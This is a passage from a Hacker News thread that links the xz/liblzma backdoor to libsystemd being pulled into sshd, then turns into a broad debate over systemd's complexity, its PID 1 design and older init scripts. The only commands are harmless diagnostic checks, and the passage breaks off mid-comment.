systemd's primary architectural fault! | | --- | --- | --- | | | |  |  | [IAmNotACellist](user?id=IAmNotACellist) [9 months ago](item?id=39869205)   | [root](#39866076) | [parent](#39869063) | [next](#39883862) [–]  systemd getting its tentacles everywhere they can squeeze is a feature, not a bug | | --- | --- | --- | | | |  |  | [yrro](user?id=yrro) [9 months ago](item?id=39883862)   | [root](#39866076) | [parent](#39866194) | [prev](#39869063) | [next](#39868949) [–]  The funny thing is that libsystemd \_used\_ to be split into several different libraries. I certainly remember libsystemd-journal (which is presumably the part of libsystemd that pulls in liblzma) being separate to libsystemd-daemon (which is the part that implements sd\_notify, as used by OpenSSH [after patching by distros]). If that split had never happened, then liblzma wouldn't have ended up being linked into sshd... | | --- | --- | --- | | | |  |  | [tonyg](user?id=tonyg) [9 months ago](item?id=39868949)   | [root](#39866076) | [parent](#39866194) | [prev](#39883862) | [next](#39866190) [–]  Strange protocol. Why not pass a path to a *file* that should be `touch`d and/or written to, I wonder? Would avoid the complexity of sockets. | | --- | --- | --- | | | |  |  | [Bu9818](user?id=Bu9818) [9 months ago](item?id=39870642)   | [root](#39866076) | [parent](#39868949) | [next](#39866190) [–]  Services may be in a different mount namespace from systemd for sandboxing or other reasons (also means you have to worry about filesystem permissions I suppose). Passing an fd from the parent (systemd) is a nice direct channel between the processes | | --- | --- | --- | | | |  |  | [NewJazz](user?id=NewJazz) [9 months ago](item?id=39870982)   | [root](#39866076) | [parent](#39870642) | [next](#39866190) [–]  But systemd precisely doesn't pass an FD. If it did, you would just need to write() and close(). | | --- | --- | --- | | | |  |  | [Bu9818](user?id=Bu9818) [9 months ago](item?id=39871161)   | [root](#39866076) | [parent](#39870982) | [next](#39866190) [–]  Yeah I was wrong about that, I confused it with socket-activation passing. The systemd-side socket is available from the process. | | --- | --- | --- | | | |  |  | [capitainenemo](user?id=capitainenemo) [9 months ago](item?id=39866190)   | [parent](#39866076) | [prev](#39866194) | [next](#39866731) [–]  FWIW, I did a quick check on a Devuan system. The sshd in Devuan does link to a libsystemd stub - this is to cut down on their maintenance of upstream packages. However that stub does not link to lzma. | | --- | --- | --- | | | |  |  | [cf100clunk](user?id=cf100clunk) [9 months ago](item?id=39866418)   | [root](#39866076) | [parent](#39866190) | [next](#39866731) [–]  On an MX Linux (non-systemd Debian-derived distro) box I ran ldd on /sbin/ssh and also ran: [EDIT: this string gives cleaner results:] ```   lsof -w -P -T -p $(pgrep sshd)|grep mem  ``` and saw liblzma in the results of both, so there is some sort of similar trickery going on. | | --- | --- | --- | | | |  |  | [capitainenemo](user?id=capitainenemo) [9 months ago](item?id=39866502)   | [root](#39866076) | [parent](#39866418) | [next](#39866731) [–]  Huh. That's rather surprising. Do you know how MX Linux handles systemd? Devuan does that shimming of upstream. Do they perhaps just try to leave out certain packages? Anyway. I did not see lzma in the results on Devuan running a process check (just in case). I did see it on a Debian. | | --- | --- | --- | | | |  |  | [cf100clunk](user?id=cf100clunk) [9 months ago](item?id=39866647)   | [root](#39866076) | [parent](#39866502) | [next](#39866731) [–]  It turns out MX uses a package called systemd-shim that seems to be the Debian one: ```   $aptitude show systemd-shim   Package: systemd-shim                       Version: 10-6   State: installed   Automatically installed: no   Priority: extra   Section: admin   Maintainer: Debian QA Group <packages@qa.debian.org>   Architecture: amd64   Uncompressed Size: 82.9 k   Depends: libc6 (>= 2.34), libglib2.0-0 (>= 2.39.4), cgmanager (>= 0.32)   Suggests: pm-utils   Conflicts: systemd-shim:i386   Breaks: systemd (< 209), systemd:i386 (< 209)   Description: shim for systemd   This package emulates the systemd function that are required to run the systemd helpers without using the init service ``` | | --- | --- | --- | | | |  |  | [bennyhill](user?id=bennyhill) [9 months ago](item?id=39866731)   | [parent](#39866076) | [prev](#39866190) | [next](#39866282) [–]  > so now security-critical daemons like openssh have additional dependencies like liblzma Systemd itself seems security-critical to me. Would removing other dependencies on libsystemd really make a secure system where systemd was compromised through its library? | | --- | --- | --- | | | |  |  | [agwa](user?id=agwa) [9 months ago](item?id=39866797)   | [root](#39866076) | [parent](#39866731) | [next](#39866282) [–]  1. systemd (at least the PID 1 part) does not talk to the network, so a remotely-accessible backdoor would need to be more complex (and thus more likely to be detected) than a backdoor that can be loaded into a listening daemon like openssh. 2. You can run Debian systems without systemd as PID 1, but you're still stuck with libsystemd because so many daemons now link with it. | | --- | --- | --- | | | |  |  | [chasil](user?id=chasil) [9 months ago](item?id=39867344)   | [root](#39866076) | [parent](#39866797) | [next](#39867035) [–]  > systemd... does not talk to the network... Socket activation and the NFS automounter appear to. If I run "netstat -ap" I see pid 1 listening on enabled units. Edit: tinysshd is specifically launched this way. Edit2: there is also substantial criticism of xz on technical grounds. <https://www.nongnu.org/lzip/xz_inadequate.html> | | --- | --- | --- | | | |  |  | [capitainenemo](user?id=capitainenemo) [9 months ago](item?id=39867035)   | [root](#39866076) | [parent](#39866797) | [prev](#39867344) | [next](#39866282) [–]  .. well, you can use a shim package as devuan did. | | --- | --- | --- | | | |  |  | [bbarnett](user?id=bbarnett) [9 months ago](item?id=39866282)   | [parent](#39866076) | [prev](#39866731) | [next](#39866240) [–]  One of the objections that many people do not understand, is that systemd adds complexity. Unnecessary complexity. Boats full, loads full, mountains full of complexity. Yes, there are things delivered with that complexity. However, as an example, sysvinit is maybe, oh, 20k lines of code including binaries, heck including all core init scripts. What's systemd? 2M lines? It was >1M lines 4+ years ago. For an init system, a thing that is to be the core of stability, security, and most importantly glacial, stable change -- that is absurdly complex. It's exceedingly over engineered. And so you get cases like this. And cases like that, and that over there, and that case over there too. All which could not exist, if systemd didn't try to overengineer, over complicate everything. Ah well. I'm still waiting for someone to basically fork systemd, remove all the fluff (udev, ntp, dns, timers, restart code, specialized logging, on and on and on), and just end up with systemd compatible service files. But not yet. So... well, oh well. | | --- | --- | --- | | | |  |  | [dralley](user?id=dralley) [9 months ago](item?id=39867378)   | [root](#39866076) | [parent](#39866282) | [next](#39866529) [–]  This is a bit like complaining that the Linux kernel has 30 million lines of code, while ignoring that 3/4 of that is in hardware support (drivers) or filesystems that nobody is actually required to use at any given time. systemd is a collection of tools, one of which is an init system. Nobody accused GNU yes of being bloated just because it's in a repository alongside 50 other tools. | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39871328)   | [root](#39866076) | [parent](#39867378) | [next](#39869691) [–]  > that nobody is actually required to use at any given time But that's the very problem with systemd! As time goes on you're *required*, whether by systemd itself or by the ecosystem around it, to use more and more of it, until it's doing not only service management but also timezones, RTC, DNS resolution, providing getpwent/getgrent, inetd, VMs and containers, bootloader, udev (without adding literally any benefit over the existing implementations), ... oh and you also have to add significant complexity in other things (like the kernel!) to use it, like namespaces (which have been a frequent source of vulnerabilities)... | | --- | --- | --- | | | |  |  | [SahAssar](user?id=SahAssar) [9 months ago](item?id=39871483)   | [root](#39866076) | [parent](#39871328) | [next](#39873258) [–]  > timezones, RTC, DNS resolution, providing getpwent/getgrent, inetd, VMs and containers, bootloader How many of those are you *actually required* to use systemd for? At least for DNS, inetd, containers and bootloader I'm pretty sure I run a few different alternatives across my systems. I think major distros (running systemd) still ship with different dns and inetd, for containers its a lot more common to use a docker-like (probably docker or podman) than it is to use systemd-nspawn. > oh and you also have to add significant complexity in other things (like the kernel!) to use it, like namespaces (which have been a frequent source of vulnerabilities) Namespaces were implemented before systemd, have been used before systemd in widely used systems (for example LXC and many others). Namespaces and similar kernel features are not tied to systemd. | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39872117)   | [root](#39866076) | [parent](#39871483) | [next](#39873258) [–]  > How many of those are you actually required to use systemd for? That depends on what other software you want to run, because systemd's design heavily encourages other things (distros, libraries, applications) to take dependencies on various bits. See also: every mainstream distro. > Namespaces were implemented before systemd, have been used before systemd in widely used systems (for example LXC and many others). Namespaces and similar kernel features are not tied to systemd. Didn't say they were. But I don't have to use LXC or many others in order to use the most popular distros and applications. I do have to use systemd for that, though. Which means I have to have namespaces enabled. | | --- | --- | --- | | | |  |  | [Bu9818](user?id=Bu9818) [9 months ago](item?id=39873258)   | [root](#39866076) | [parent](#39871328) | [prev](#39871483) | [next](#39869691) [–]  >namespaces (which have been a frequent source of vulnerabilities)... Unprivileged user namespaces sure, but I don't think that applies to namespaces in general (which without unprivileged user namespaces can only be created by root, and LPE is the concern with unprivileged userns due to increased attack surface). systemd doesn't need unprivileged userns to run. | | --- | --- | --- | | | |  |  | [msm\_](user?id=msm_) [9 months ago](item?id=39869691)   | [root](#39866076) | [parent](#39867378) | [prev](#39871328) | [next](#39866529) [–]  Gnu yes is actually pretty bloated. It's 130 lines of code for something so trivial [1]! ;) [1] <https://github.com/coreutils/coreutils/blob/master/src/yes.c> | | --- | --- | --- | | | |  |  | [pixelbeat](user?id=pixelbeat) [9 months ago](item?id=39876211)   | [root](#39866076) | [parent](#39869691) | [next](#39866529) [–]  yes(1) is the standard unix way of generating repeated data. It's good to do this as quickly as possible. I really don't understand why so many get annoyed with this code. 130 lines isn't that complicated in the scheme of things. | | --- | --- | --- | | | |  |  | [jorvi](user?id=jorvi) [9 months ago](item?id=39866529)   | [root](#39866076) | [parent](#39866282) | [prev](#39867378) | [next](#39867248) [–]  > Ah well. I'm still waiting for someone to basically fork systemd, remove all the fluff (udev, ntp, dns, timers, restart code, specialized logging, on and on and on) Most of the things you named there are modular and can be easily disabled. Furthermore, udev precedes systemd and systemd has in fact its own replacement for it (though the name escapes me). Kind of a classic, people loving harping on systemd without properly understanding it. | | --- | --- | --- | | | |  |  | [johnny22](user?id=johnny22) [9 months ago](item?id=39866663)   | [root](#39866076) | [parent](#39866529) | [next](#39869843) [–]  systemd subsumed udev. Eudev is what folks who don't have systemd use. | | --- | --- | --- | | | |  |  | [nottorp](user?id=nottorp) [9 months ago](item?id=39869843)   | [root](#39866076) | [parent](#39866529) | [prev](#39866663) | [next](#39867248) [–]  > are modular and can be easily disabled. That's a common defense for any bloatware. If they're modular and easily disabled then why are they all enabled by default? | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39867248)   | [root](#39866076) | [parent](#39866282) | [prev](#39866529) | [next](#39869409) [–]  Systemd is actually pretty damn good *and* it's GPL licensed free software. I understand that people don't like the way it seems to work itself into the rest of Linux user space as a dependency but that's actually our own fault for not investing the man power that Red Hat invests. We have better things to do than make our own Linux user space and so they have occupied that niche. It's free software though, we always have the freedom to do whatever we want. By the way, all the stuff you mentioned is not really part of the actual init system, namely PID 1. There's an actual service manager for example and it's entirely separate from init. It manages services really well too, it's measurably better than all that "portable" nonsense just by virtue of using cgroups to manage processes which means it can actually supervise poorly written double forking daemons. | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39871366)   | [root](#39866076) | [parent](#39867248) | [next](#39867683) [–]  > By the way, all the stuff you mentioned is not really part of the actual init system, namely PID 1 Except it literally is. I once had a systemd system suddenly refuse to boot (kernel panic because PID1 crashed or so) after a Debian upgrade, which I was able to resolve by... wait for it... making /etc/localtime not be a symlink. Why does a failure doing something with the timezone make you unable to boot your system? What is it even doing with the timezone? What is failing about it? Who knows, good luck strace'ing PID1! | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39872007)   | [root](#39866076) | [parent](#39871366) | [next](#39867683) [–]  Turns out you're right and my knowledge was outdated. I seriously believed the systemd service manager was separate from its PID 1 but at some point they even changed the manuals to say that's not supported. I was also corrected further down in the thread, with citations from the maintainers even: <https://news.ycombinator.com/item?id=39871735> As it stands I really have no idea why the service manager has not been split off from PID 1. Maintainer said that PID 1 was "different" but didn't really elaborate. Can't find much reliable information about said differences either. Do you know? | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39872110)   | [root](#39866076) | [parent](#39872007) | [next](#39867683) [–]  I have no idea, lol. Maybe the signal handling behavior? You can't signal PID1 (unless the process has installed its own signal handler for that signal). Even SIGKILL won't usually work. That's my entire problem with systemd though: despite the averred modularity, it combines far too many concerns for anyone to understand how or why it works the way it does. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39872323)   | [root](#39866076) | [parent](#39872110) | [next](#39867683) [–]  Yeah the signal handling thing is true, PID 1 is the only process that can handle or mask SIGKILL, maybe even SIGSTOP. The systemd manual documents its handling of a ton of signals but there's nothing in there about either of those otherwise unmaskable signals. So I don't really see how systemd is "relying" on anything. It's not handling SIGKILL, is it? The other difference is PID 1 can't exit because Linux panics if it does. That's actually an argument for moving functionality out of PID 1. There are other service managers out there which work outside PID 1. Systemd itself literally spawns non-PID 1 instances of itself to handle the user services. I suppose only the maintainers can tell us why they did it that way. Maybe they *are* relying on the fact PID 1 traditionally reaps zombies even though Linux has a prctl for that: <https://www.man7.org/linux/man-pages/man2/prctl.2.html> ```   PR_SET_CHILD_SUBREAPER  ``` What if the issue is just that nobody's bothered to write the code to move the zombie process reaping to a separate process yet? Would they accept patches in that case? Ludicrously, that manual page straight up says systemd uses this system call to set itself up as the reaper of zombie processes: > Some init(1) frameworks (e.g., systemd(1)) employ a subreaper process If that's true then I really have no idea what the hell it is about PID 1 that they're relying on. Edit: just checked the source code and it's actually true. [https://github.com/systemd/systemd/blob/main/src/core/main.c...](https://github.com/systemd/systemd/blob/main/src/core/main.c#L2397) [https://github.com/systemd/systemd/blob/main/src/basic/proce...](https://github.com/systemd/systemd/blob/main/src/basic/process-util.c#L2011-L2027) [https://github.com/systemd/systemd/blob/main/src/basic/proce...](https://github.com/systemd/systemd/blob/main/src/basic/process-util.c#L1996-L2009) So they're not relying on the special signals handling and they even have special support for non-PID 1 child subreapers. Makes no sense to me. Why can't they just drop those PID == 1 checks and make a simpler PID 1 program that just spawns the real systemd service manager? Edit: they *already* have a simple PID 1 in the code base! [https://github.com/systemd/systemd/blob/main/src/nspawn/nspa...](https://github.com/systemd/systemd/blob/main/src/nspawn/nspawn-stub-pid1.c#L52) It's only being used inside namespaces though! Why? No idea. | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39880120)   | [root](#39866076) | [parent](#39872323) | [next](#39867683) [–]  > The other difference is PID 1 can't exit because Linux panics if it does. That's actually an argument for moving functionality out of PID 1. I actually kinda think that can be an advantage for a service manager. If your service manager crashes an automatic reboot is nice, in a way. I doubt that's why they did it though. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39883608)   | [root](#39866076) | [parent](#39880120) | [next](#39867683) [–]  > If your service manager crashes an automatic reboot is nice, in a way. I don't think it's gonna do that! I saw it in the source code: when it's running as PID 1, systemd installs a crash handler that freezes itself in a desperate attempt to avoid the kernel panic! It's pretty amazing. They could have written it so that PID 1 watches over the service manager and just restarts it if it ever crashes. I mean, systemd already supports soft-rebooting the entire user space which is pretty much exactly what would happen if PID 1 restarted a separate service manager. Know what else I found in the source code? Various references to /proc/1. I'm starting to think that's the true reason why they want to be PID 1... | | --- | --- | --- | | | |  |  | [pessimizer](user?id=pessimizer) [9 months ago](item?id=39867683)   | [root](#39866076) | [parent](#39867248) | [prev](#39871366) | [next](#39867685) [–]  People are complaining that it's too big, labyrinthine, and arcane to audit, not that it doesn't work. They would prefer other things that work, but don't share those characteristics. Also, the more extensive the remit (of this init), the more complexly interconnected the interactions between the components; the fewer people understand the architecture, the fewer people understand the code, the fewer people read the code. This creates a situation where the codebase is getting larger and larger at a rate faster than the growth of the number of man-hours being put into reading it. This has to make it easier for people who are systemd specialists to put in (intentionally or unintentionally) backdoors and exploitable bugs that will last for years. People keep defending systemd by talking about its UI and its features, but that completely misses the point. If systemd were replaced by something comprehensible and less internally codependent, *even if* the systemd UI and features were preserved, most systemd complainers would be over the moon with happiness. Red Hat invests too much into completely replacing linux subsystems, they should take a break. Maybe fix the bugs in MATE. | | --- | --- | --- | | | |  |  | [dralley](user?id=dralley) [9 months ago](item?id=39868815)   | [root](#39866076) | [parent](#39867683) | [next](#39869137) [–]  >the more complexly interconnected the interactions between the components This is a bit of a rich criticism of systemd, given the init scripts it replaced. > Red Hat invests too much into completely replacing linux subsystems, they should take a break. Maybe fix the bugs in MATE. MATE isn't a Red Hat project. And nobody complains about Pipewire. | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39871378)   | [root](#39866076) | [parent](#39868815) | [next](#39869137) [–]  A shell script with a few defined arguments is not a complexly interconnected set of components. It's literally the simplest, most core, least-strongly-dependent interconnection that exists in a nix system. Tell us you never bothered to understand how init worked before drawing a conclusion on it without telling us. | | --- | --- | --- | | | |  |  | [dralley](user?id=dralley) [9 months ago](item?id=39877511)   | [root](#39866076) | [parent](#39871378) | [next](#39869137) [–]  Have you ever seen the init scripts of a reasonably-complex service that required other services to be online? | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39880109)   | [root](#39866076) | [parent](#39877511) | [next](#39869137) [–]  Yep. ```     depend(){         need net localmount         after bootmisc     } ``` | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39869137)   | [root](#39866076) | [parent](#39867683) | [prev](#39868815) | [next](#39868888) [–]  > Red Hat invests too much into completely replacing linux subsystems, they should take a break. They should do whatever they feel is best for them, as should we. They're releasing free as in freedom GPL Linux software, high quality software at that. Thus I have no moral objections to their activities. You have to realize that this is really a symptom of *others* not putting in the required time and effort to produce a better alternative. I know because I reinvent things regularly just because I enjoy it. People underestimate by many orders of magnitude the effort required to make something like this. So I'm really thankful that I got systemd, despite many valid criticisms. It's a pretty good system, and it's not proprietary nonsense. I've learned to appreciate it. | | --- | --- | --- | | | |  |  | [\_factor](user?id=_factor) [9 months ago](item?id=39868888)   | [root](#39866076) | [parent](#39867683) | [prev](#39869137) | [next](#39867685) [–]  Let’s not get started on how large the kernel is. Large code bases increase attack surface, period. The only sensible solution is to micro service out the pieces and only install the bare essentials. Why does the an x86 server come with Bluetooth drivers baked in? The kernel devs are wasting time writing one offs for every vendor known to man, and it ships to desktops too. | | --- | --- | --- | | | |  |  | [ongy](user?id=ongy) [9 months ago](item?id=39867685)   | [root](#39866076) | [parent](#39867248) | [prev](#39867683) | [next](#39869409) [–]  How is the service manager different from PID1/init? | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39869002)   | [root](#39866076) | [parent](#39867685) | [next](#39869409) [–]  They are completely different things. Init just a more or less normal program that Linux starts by default and by convention. You can make it boot straight into bash if you want. I created a little programming language with the ultimate goal of booting Linux directly into it and bringing up the entire system from inside it. It's just a normal process really. Two special cases that I can think of: no default signal handling, and it can't ever exit. Init will not get interrupted by signals unless it explicitly configures the signal dispositions, even SIGKILL will not kill it. Linux will panic if PID 1 ever exits so it can't do that. Traditionally, it's also the orphaned child process reaper. Process descriptors and their IDs hang around in memory until something calls wait on them. Parent processes are supposed to do that but if they don't it's up to init to do it. Well, that's the way it works traditionally on Unix. On Linux though that's customizable with prctl and PR\_SET\_CHILD\_SUBREAPER so you actually can factor that out to a separate process. As far as I know, systemd does just that, making it *more* modular and straight up *better* than traditional Unix, simply because this separate process won't make Linux panic if it ever crashes. As for the service manager, this page explains process and service management extremely well: <https://mywiki.wooledge.org/ProcessManagement> Systemd does it right. It does everything that's described in there, does it correctly, uses powerful Linux features like cgroups for even better process management and also solves the double forking problem described in there. It's essentially a solved problem with systemd. Even the people who hate it love the unit files it uses and for good reason. | | --- | --- | --- | | | |  |  | [ongy](user?id=ongy) [9 months ago](item?id=39871735)   | [root](#39866076) | [parent](#39869002) | [next](#39869409) [–]  I know the differences between them conceptionally. The thing that people usually complain about is systemd forcibly setting its process manager at pid=1. I.e. the thing "discussed" in <https://github.com/systemd/systemd/issues/12843> There is a secondary feature to run per-user managers, though I'm unsure whether it does run doesn't run without systemd PID1. Though it might only rely on logind. | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39871933)   | [root](#39866076) | [parent](#39871735) | [next](#39869409) [–]  Wow, I remember reading that PID != 1 line years ago. Had no idea they changed it. I stand corrected then. Given the existence of user service managers as well as flags like --system and --user, I inferred that they were all entirely separate processes. Makes no sense to me why the service manager part would require running as PID 1. The maintainer just says this: > PID 1 is very different from other processes, and we rely on that. He doesn't really elaborate on the matter though. Every time this topic comes up I end up searching for those so called PID 1 differences. I come up short every time aside from the two things I mentioned above. Is this information buried deep somewhere? Just asked ChatGPT about PID 1 differences. It gave me the aforementioned two differences, completely dismissed Linux's prctl child subreaper feature "because PID 1 often assumes this role in practice" as well as some total bullshit about process group leaders and regular processes not being special enough to interact with the kernel which is just absolute nonsense. So I really have no idea what it is about PID 1 that systemd is supposedly relying on that makes it impossible to split off the service manager from it. Everything I have read up until now suggests that it is not required, *especially* on Linux where you have even more control and it's not like systemd is shy about using Linux exclusive features. | | --- | --- | --- | | | |  |  | [quotemstr](user?id=quotemstr) [9 months ago](item?id=39869409)   | [root](#39866076) | [parent](#39866282) | [prev](#39867248) | [next](#39868967) [–]  > One of the objections that many people do not understand, is that systemd adds complexity. Unnecessary complexity. Boats full, loads full, mountains full of complexity. Complexity that would otherwise be distributed to a sea of ad-hoc shell scripts? systemd is a win | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39871344)   | [root](#39866076) | [parent](#39869409) | [next](#39868967) [–]  The init-scripts that predated systemd were actually pretty damn simple. So was init itself. | | --- | --- | --- | | | |  |  | [adql](user?id=adql) [9 months ago](item?id=39915364)   | [root](#39866076) | [parent](#39871344) | [next](#39868967) [–]  We removed tens of thousands of lines of code for fixes for those "simple" init scripts when migrating to systemd. They are never "simple", there is always some fucking edge case, like for example we had Java apps writing its own PID few seconds after start. So any app that did start and immediately after status (like Pacemaker) threw errors. Or how once in blue moon MySQL didn't start after reboot because it so happened that: \* the PID file from previous boot wasn't cleared \* some other app ran with same PID as it was in file \* Script did not care, script saw pid file existing and didn't start MySQL. Both examples from pre-systemd CentOS | | --- | --- | --- | | | |  |  | [bananapub](user?id=bananapub) [9 months ago](item?id=39868967)   | [root](#39866076) | [parent](#39866282) | [prev](#39869409) | [next](#39869077) [–]  > One of the objections that many people do not understand, is that systemd adds complexity. Unnecessary complexity. Boats full, loads full, mountains full of complexity. this is and always has been such a dumb take. if you'd like to implement an init (and friends) system that doesn't have "unnecessary complexity" and still provides all the functionality that people currently want, then go and do so and show us? otherwise it's just whinging about things not being like the terrible old days of init being a mass of buggy and racey shell scripts. | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39871351)   | [root](#39866076) | [parent](#39868967) | [next](#39869280) [–]  There were plenty of those that existed even before systemd. Systemd's adoption was not a result of providing the functionality that people want but rather was a result of providing functionality that a few important people wanted and promptly took hard dependencies on. | | --- | --- | --- | | | |  |  | [simoncion](user?id=simoncion) [9 months ago](item?id=39869280)   | [root](#39866076) | [parent](#39868967) | [prev](#39871351) | [next](#39869077) [–]  > about things not being like the terrible old days of init being a mass of buggy and racey shell scripts. Zero of the major distros used System V init by default. Probably only distros like Slackware or Linux From Scratch even suggested it. It's unfortunate that so many folks uncritically swallowed the Systemd Cabal's claims about how they were the first to do this, that, or the other. (It's also darkly amusing to note that every service that has nontrivial pre-start or post-start configuration and/or verification requirements ends up using systemd to run at least one shell script... which is what would have often been inlined into their init script in other init systems.) | | --- | --- | --- | | | |  |  | [bananapub](user?id=bananapub) [9 months ago](item?id=39870377)   | [root](#39866076) | [parent](#39869280) | [next](#39869077) [–]  > Zero of the major distros used System V init by default. Probably only distros like Slackware or Linux From Scratch even suggested it. I have absolutely no idea what you're trying to claim. Are you suggesting that Debian's "sysvinit" package wasn't a System V init system? That the years I spent editing shell scripts in /etc/init.d/ wasn't System V init? or are you making some pointless distinction about it not actually being pre-lawsuit AT&T files so it doesn't count or something? or did you not use Linux before 2010? if you have some important point to make, please make it more clearly. > It's unfortunate that so many folks uncritically swallowed the Systemd Cabal's claims about how they were the first to do this, that, or the other. I feel like you have very strong emotions about init systems that have nothing to do with the comment you're replying to. | | --- | --- | --- | | | |  |  | [simoncion](user?id=simoncion) [9 months ago](item?id=39916719)   | [root](#39866076) | [parent](#39870377) | [next](#39869077) [–]  > or did you not use Linux before 2010? I've been using Linux regularly since 2002. I've never regularly used a Linux that used sysvinit. In other words, over the past ~22 years (goddamn, where did the time go?) every Linux I've regularly used has had an init system that allows you to specify service dependencies to determine their start order. > ...Debian... Ah. That explains it. Debian's fine to build on top of but a bad distro to actually use. (Unless you really like using five-to-ten (and in some cases 25->35) year old software that's been superseded by much-improved versions.) You should also consider that packages named "sysvinit" sometimes aren't actually what people think of when they hear "sysvinit": <<https://wiki.gentoo.org/wiki/Sysvinit>> | | --- | --- | --- | | | |  |  | [marcosdumay](user?id=marcosdumay) [9 months ago](item?id=39869077)   | [root](#39866076) | [parent](#39866282) | [prev](#39868967) | [next](#39866353) [–]  As long as Gnome requires bug-compatibility with systemd, nobody will rewrite it. | | --- | --- | --- | | | |  |  | [gavinhoward](user?id=gavinhoward) [9 months ago](item?id=39866353)   | [root](#39866076) | [parent](#39866282) | [prev](#39869077) | [next](#39866240) [–]  I have a design in the works to do just this. The problem? It's on the backburner because I don't think I could find a business model to make money from it. I don't think offering support for a price would work, for example. | | --- | --- | --- | | | |  |  | [iforgotpassword](user?id=iforgotpassword) [9 months ago](item?id=39867766)   | [root](#39866076) | [parent](#39866353) | [next](#39867548) [–]  What's the point of your implementation? systemd is totally modular, you can use just the init system without networkd, timesyncd, resolved, nspawn, whatever else I forgot about. If you want you can just use systemd as PID1 for service management and enjoy a sane way to define and manage services – and do everything in archaic ways like 20 years ago. | | --- | --- | --- | | | |  |  | [gavinhoward](user?id=gavinhoward) [9 months ago](item?id=39868029)   | [root](#39866076) | [parent](#39867766) | [next](#39871388) [–]  There are two points to the implementation: \* Choice. If I have a separate implementation, my users do not have to be subject to systemd's choices. And I do not either. \* The same implementation will have the same bugs, so in the same way that redundant software has multiple independent implementations, having an independent implementation will avoid the same bugs. It may have different bugs, sure, but my goal would be to test like SQLite and achieve DO-178C certification. Or as close as I could, anyway. | | --- | --- | --- | | | |  |  | [iforgotpassword](user?id=iforgotpassword) [9 months ago](item?id=39868512)   | [root](#39866076) | [parent](#39868029) | [next](#39871388) [–]  I'd assume chances of monetizing this are incredibly low. There already is an init system that understands systemd unit files, the name escapes my mind unfortunately. DO-178C might be a selling point literally, but whether there's enough potential customers for ROI is questionable. | | --- | --- | --- | | | |  |  | [JdeBP](user?id=JdeBP) [9 months ago](item?id=39873934)   | [root](#39866076) | [parent](#39868512) | [next](#39868622) [–]  Ahem! \* [https://jdebp.uk/Softwares/nosh/guide/converting-systemd-uni...](https://jdebp.uk/Softwares/nosh/guide/converting-systemd-units.html) | | --- | --- | --- | | | |  |  | [gavinhoward](user?id=gavinhoward) [9 months ago](item?id=39868622)   | [root](#39866076) | [parent](#39868512) | [prev](#39873934) | [next](#39871388) [–]  I unfortunately agree with you. Hence why it's on the backburner. | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39871388)   | [root](#39866076) | [parent](#39867766) | [prev](#39868029) | [next](#39867548) [–]  No, you can't. Systemd might be somewhat modular; the things distros ship which depend on it are not. | | --- | --- | --- | | | |  |  | [iforgotpassword](user?id=iforgotpassword) [9 months ago](item?id=39872503)   | [root](#39866076) | [parent](#39871388) | [next](#39867548) [–]  Well some distros might force more components upon you but thas hardly systemd's fault. Same if some software decides to make use of another component of systemd - then that's their choice, but also there are alternatives. The only thing that comes to mind right now would be something like GNOME which requires logind, but all other "typical" software only wants systemd-the-init-system if anything. You can run Debian just fine with just systemd as an init system and nothing else. | | --- | --- | --- | | | |  |  | [adr1an](user?id=adr1an) [9 months ago](item?id=39867548)   | [root](#39866076) | [parent](#39866353) | [prev](#39867766) | [next](#39866240) [–]  What about sponsors? Actually, now I have the idea of a platform similar to Kickstarter but for software development, and with just sponsors. It wouldn't work, sure... Except in some cases. Like when things like this happen... | | --- | --- | --- | | | |  |  | [gavinhoward](user?id=gavinhoward) [9 months ago](item?id=39868041)   | [root](#39866076) | [parent](#39867548) | [next](#39866240) [–]  Sponsors are fickle, unfortunately, and they tend to remove "donations" when money gets tight. If I am considered a full vendor, though, and a vendor for a critical piece of software, they might keep me around. | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39866240)   | [parent](#39866076) | [prev](#39866282) | [next](#39867126) [–]  Also thanks to Debian for modifying openssh. | | --- | --- | --- | | | |  |  | [cassianoleal](user?id=cassianoleal) [9 months ago](item?id=39866366)   | [root](#39866076) | [parent](#39866240) | [next](#39867126) [–]  You're not wrong. Had Debian not patched it in this way, OP might have never found it, leaving all other distros who do the same vulnerable. Note that OP found this in Debian sid as well, which means it's highly unlikely this issue will find its way into any Debian stable systems. | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39866494)   | [root](#39866076) | [parent](#39866366) | [next](#39866704) [–]  Right, the systemd notification framework is very simple and I've used it in my projects. I didn't even know that libsystemd provided an implementation. My Arch system was not vulnerable because openssh was not linked to xz. IMO every single commit from JiaT75 should be reviewed and maybe even rolled back, as they have obliterated their trust. edit: <https://github.com/google/oss-fuzz/pull/10667> Even this might be nefarious. | | --- | --- | --- | | | |  |  | [gopher\_space](user?id=gopher_space) [9 months ago](item?id=39866943)   | [root](#39866076) | [parent](#39866494) | [next](#39866704) [–]  > the systemd notification framework is very simple and I've used it in my projects Have you come across an outline or graph of systemd that you really like, or maybe a good 